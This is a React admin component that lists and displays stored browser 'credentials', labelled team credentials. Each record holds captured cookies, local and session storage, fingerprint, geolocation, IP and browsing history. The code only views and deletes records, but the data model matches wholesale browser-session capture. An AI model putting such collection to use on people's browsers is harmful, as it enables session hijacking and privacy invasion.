'use client'

import { useState, useEffect } from 'react'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Eye, Trash2, RefreshCw, Download } from 'lucide-react'

interface Credential {
  id: string
  createdAt: string
  credentialSource: string
  lastUsedAt?: string
  ipAddress?: string
  userAgent?: string
  platform?: string
  browser?: string
  cookies: Record<string, any>
  localStorage: Record<string, any>
  sessionStorage: Record<string, any>
  fingerprint?: Record<string, any>
  geoLocation?: any
  metadata?: Record<string, any>
  browserHistory?: any
  tabs?: any
  bookmarks?: any
  downloads?: any
  extensions?: any
  isActive: boolean
}

export default function CredentialsManagement() {
  const [credentials, setCredentials] = useState<Credential[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [actionLoading, setActionLoading] = useState<string | null>(null)
  const [selectedCredentials, setSelectedCredentials] = useState<string[]>([])
  const [viewingCredential, setViewingCredential] = useState<Credential | null>(null)

  const loadCredentials = async () => {
    try {
      setIsLoading(true)
      setError(null)
      
      const token = localStorage.getItem('choco_token')
      if (!token) {
        setError('No authentication token found')
        return
      }

      const response = await fetch('/api/credentials/get', {
        headers: { 'Authorization': `Bearer ${token}` }
      })

      if (!response.ok) {
        throw new Error('Failed to fetch credentials')
      }

      const data = await response.json()
      if (data.success) {
        setCredentials(data.data?.credentials || [])
      } else {
        setError(data.error || 'Failed to load credentials')
      }
    } catch (error) {
      console.error('Failed to load credentials:', error)
      setError('Failed to load credentials')
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (credentialId: string) => {
    if (!confirm('Are you sure you want to delete this credential?')) return
    
    setActionLoading(credentialId)
    try {
      const token = localStorage.getItem('choco_token')
      if (!token) {
        alert('No authentication token found')
        return
      }

      const response = await fetch(`/api/credentials/cleanup?credentialId=${credentialId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })

      const result = await response.json()
      if (result.success) {
        setCredentials(prev => prev.filter(c => c.id !== credentialId))
        alert('Credential deleted successfully')
      } else {
        alert(result.message || 'Failed to delete credential')
      }
    } catch (error) {
      console.error('Failed to delete credential:', error)
      alert('Failed to delete credential')
    } finally {
      setActionLoading(null)
    }
  }

  const handleView = (credential: Credential) => {
    setViewingCredential(credential)
  }

  const closeViewModal = () => {
    setViewingCredential(null)
  }

  const handleRefresh = () => {
    loadCredentials()
  }

  useEffect(() => {
    loadCredentials()
  }, [])

  const handleSelectAll = () => {
    if (selectedCredentials.length === credentials.length) {
      setSelectedCredentials([])
    } else {
      setSelectedCredentials(credentials.map(c => c.id))
    }
  }

  const handleSelectCredential = (credentialId: string) => {
    setSelectedCredentials(prev => 
      prev.includes(credentialId) 
        ? prev.filter(id => id !== credentialId)
        : [...prev, credentialId]
    )
  }

  const handleBulkDelete = () => {
    selectedCredentials.forEach(id => handleDelete(id))
    setSelectedCredentials([])
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    })
  }

  const getCookieCount = (cookies: Record<string, any>) => {
    return Object.keys(cookies || {}).length
  }

  const getStorageCount = (storage: Record<string, any>) => {
    return Object.keys(storage || {}).length
  }

  const truncateText = (text: string, maxLength: number = 30) => {
    return text.length > maxLength ? `${text.substring(0, maxLength)}...` : text
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold text-slate-900">Credentials Management</h2>
          <p className="text-slate-600">Manage team credentials and browser data</p>
        </div>
        <div className="flex items-center space-x-3">
          {selectedCredentials.length > 0 && (
            <Button
              variant="destructive"
              size="sm"
              onClick={handleBulkDelete}
              className="flex items-center space-x-2"
            >
              <Trash2 className="w-4 h-4" />
              <span>Delete Selected ({selectedCredentials.length})</span>
            </Button>
          )}
          <Button
            variant="outline"
            size="sm"
            onClick={handleRefresh}
            className="flex items-center space-x-2"
          >
            <RefreshCw className="w-4 h-4" />
            <span>Refresh</span>
          </Button>
        </div>
      </div>

      {/* Loading State */}
      {isLoading && (
        <div className="bg-white rounded-lg shadow-sm border p-8">
          <div className="flex items-center justify-center space-x-3">
            <RefreshCw className="w-5 h-5 animate-spin text-slate-400" />
            <span className="text-slate-600">Loading credentials...</span>
          </div>
        </div>
      )}

      {/* Error State */}
      {error && !isLoading && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-4">
          <div className="text-red-800 font-medium">Error loading credentials</div>
          <div className="text-red-600 text-sm mt-1">{error}</div>
          <Button
            variant="outline"
            size="sm"
            onClick={handleRefresh}
            className="mt-3"
          >
            Try Again
          </Button>
        </div>
      )}

      {/* Credentials Table */}
      {!isLoading && !error && (
        <div className="bg-white rounded-lg shadow-sm border overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-slate-50 border-b">
              <tr>
                <th className="px-4 py-3 text-left">
                  <input
                    type="checkbox"
                    checked={selectedCredentials.length === credentials.length && credentials.length > 0}
                    onChange={handleSelectAll}
                    className="rounded border-slate-300"
                  />
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  ID & Status
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Browser Info
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Data Summary
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Created
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Last Used
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Actions
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-slate-200">
              {credentials.map((credential) => (
                <tr key={credential.id} className="hover:bg-slate-50">
                  <td className="px-4 py-4">
                    <input
                      type="checkbox"
                      checked={selectedCredentials.includes(credential.id)}
                      onChange={() => handleSelectCredential(credential.id)}
                      className="rounded border-slate-300"
                    />
                  </td>
                  
                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="text-sm font-mono text-slate-600">
                        {credential.id.substring(0, 8)}...
                      </div>
                      <div className="flex items-center space-x-2">
                        <Badge 
                          className={credential.isActive 
                            ? "bg-green-100 text-green-700" 
                            : "bg-gray-100 text-gray-700"
                          }
                        >
                          {credential.isActive ? 'Active' : 'Inactive'}
                        </Badge>
                        <Badge variant="outline" className="text-xs">
                          {credential.credentialSource}
                        </Badge>
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="text-sm font-medium text-slate-900">
                        {credential.browser || 'Unknown'}
                      </div>
                      <div className="text-xs text-slate-500">
                        {credential.platform || 'Unknown Platform'}
                      </div>
                      <div className="text-xs text-slate-400">
                        {credential.ipAddress || 'No IP'}
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="flex items-center space-x-3 text-xs">
                        <span className="text-slate-600">
                          🍪 {getCookieCount(credential.cookies)}
                        </span>
                        <span className="text-slate-600">
                          💾 {getStorageCount(credential.localStorage)}
                        </span>
                        <span className="text-slate-600">
                          📱 {getStorageCount(credential.sessionStorage)}
                        </span>
                      </div>
                      <div className="flex items-center space-x-2">
                        {credential.fingerprint && (
                          <Badge variant="outline" className="text-xs">Fingerprint</Badge>
                        )}
                        {credential.geoLocation && (
                          <Badge variant="outline" className="text-xs">Location</Badge>
                        )}
                        {credential.browserHistory && (
                          <Badge variant="outline" className="text-xs">History</Badge>
                        )}
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="text-sm text-slate-900">
                      {formatDate(credential.createdAt)}
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="text-sm text-slate-900">
                      {credential.lastUsedAt 
                        ? formatDate(credential.lastUsedAt)
                        : 'Never'
                      }
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="flex items-center space-x-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleView(credential)}
                        className="flex items-center space-x-1"
                      >
                        <Eye className="w-3 h-3" />
                        <span>View</span>
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleDelete(credential.id)}
                        disabled={actionLoading === credential.id}
                        className="flex items-center space-x-1 text-red-600 hover:text-red-700 disabled:opacity-50"
                      >
                        {actionLoading === credential.id ? (
                          <RefreshCw className="w-3 h-3 animate-spin" />
                        ) : (
                          <Trash2 className="w-3 h-3" />
                        )}
                        <span>{actionLoading === credential.id ? 'Deleting...' : 'Delete'}</span>
                      </Button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {credentials.length === 0 && (
          <div className="text-center py-12">
            <div className="text-slate-400 text-lg mb-2">No credentials found</div>
            <div className="text-slate-500 text-sm">
              Team members haven't set up any credentials yet
            </div>
          </div>
        )}
      </div>
      )}

      {/* Summary Footer */}
      {!isLoading && !error && credentials.length > 0 && (
        <div className="bg-slate-50 rounded-lg p-4">
          <div className="flex items-center justify-between text-sm text-slate-600">
            <span>Total: {credentials.length} credentials</span>
            <span>Active: {credentials.filter(c => c.isActive).length}</span>
            <span>Selected: {selectedCredentials.length}</span>
          </div>
        </div>
      )}

      {/* Detailed View Modal */}
      {viewingCredential && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg shadow-xl max-w-4xl w-full max-h-[90vh] overflow-hidden">
            <div className="flex items-center justify-between p-6 border-b">
              <h3 className="text-lg font-semibold text-slate-900">
                Credential Details - {viewingCredential.id.substring(0, 8)}...
              </h3>
              <Button
                variant="outline"
                size="sm"
                onClick={closeViewModal}
                className="flex items-center space-x-1"
              >
                <span>Close</span>
              </Button>
            </div>
            
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-120px)]">
              <div className="space-y-6">
                {/* Basic Info */}
                <div>
                  <h4 className="font-medium text-slate-900 mb-3">Basic Information</h4>
                  <div className="bg-slate-50 rounded-lg p-4">
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <span className="font-medium text-slate-600">ID:</span>
                        <div className="font-mono text-slate-900">{viewingCredential.id}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Status:</span>
                        <div>
                          <Badge className={viewingCredential.isActive ? "bg-green-100 text-green-700" : "bg-gray-100 text-gray-700"}>
                            {viewingCredential.isActive ? 'Active' : 'Inactive'}
                          </Badge>
                        </div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Source:</span>
                        <div className="text-slate-900">{viewingCredential.credentialSource}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Browser:</span>
                        <div className="text-slate-900">{viewingCredential.browser || 'Unknown'}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Platform:</span>
                        <div className="text-slate-900">{viewingCredential.platform || 'Unknown'}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">IP Address:</span>
                        <div className="text-slate-900">{viewingCredential.ipAddress || 'N/A'}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Created:</span>
                        <div className="text-slate-900">{formatDate(viewingCredential.createdAt)}</div>
                      </div>
                      <div>
                        <span className="font-medium text-slate-600">Last Used:</span>
                        <div className="text-slate-900">{viewingCredential.lastUsedAt ? formatDate(viewingCredential.lastUsedAt) : 'Never'}</div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Cookies */}
                <div>
                  <h4 className="font-medium text-slate-900 mb-3">Cookies ({getCookieCount(viewingCredential.cookies)})</h4>
                  <div className="bg-slate-50 rounded-lg p-4">
                    <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                      {JSON.stringify(viewingCredential.cookies, null, 2)}
                    </pre>
                  </div>
                </div>

                {/* Local Storage */}
                <div>
                  <h4 className="font-medium text-slate-900 mb-3">Local Storage ({getStorageCount(viewingCredential.localStorage)})</h4>
                  <div className="bg-slate-50 rounded-lg p-4">
                    <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                      {JSON.stringify(viewingCredential.localStorage, null, 2)}
                    </pre>
                  </div>
                </div>

                {/* Session Storage */}
                <div>
                  <h4 className="font-medium text-slate-900 mb-3">Session Storage ({getStorageCount(viewingCredential.sessionStorage)})</h4>
                  <div className="bg-slate-50 rounded-lg p-4">
                    <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                      {JSON.stringify(viewingCredential.sessionStorage, null, 2)}
                    </pre>
                  </div>
                </div>

                {/* User Agent */}
                {viewingCredential.userAgent && (
                  <div>
                    <h4 className="font-medium text-slate-900 mb-3">User Agent</h4>
                    <div className="bg-slate-50 rounded-lg p-4">
                      <div className="text-xs text-slate-700 break-all">
                        {viewingCredential.userAgent}
                      </div>
                    </div>
                  </div>
                )}

                {/* Fingerprint */}
                {viewingCredential.fingerprint && (
                  <div>
                    <h4 className="font-medium text-slate-900 mb-3">Fingerprint</h4>
                    <div className="bg-slate-50 rounded-lg p-4">
                      <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                        {JSON.stringify(viewingCredential.fingerprint, null, 2)}
                      </pre>
                    </div>
                  </div>
                )}

                {/* Metadata */}
                {viewingCredential.metadata && (
                  <div>
                    <h4 className="font-medium text-slate-900 mb-3">Metadata</h4>
                    <div className="bg-slate-50 rounded-lg p-4">
                      <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                        {JSON.stringify(viewingCredential.metadata, null, 2)}
                      </pre>
                    </div>
                  </div>
                )}

                {/* Browser History */}
                {viewingCredential.browserHistory && (
                  <div>
                    <h4 className="font-medium text-slate-900 mb-3">Browser History</h4>
                    <div className="bg-slate-50 rounded-lg p-4">
                      <pre className="text-xs text-slate-700 whitespace-pre-wrap overflow-x-auto">
                        {JSON.stringify(viewingCredential.browserHistory, null, 2)}
                      </pre>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
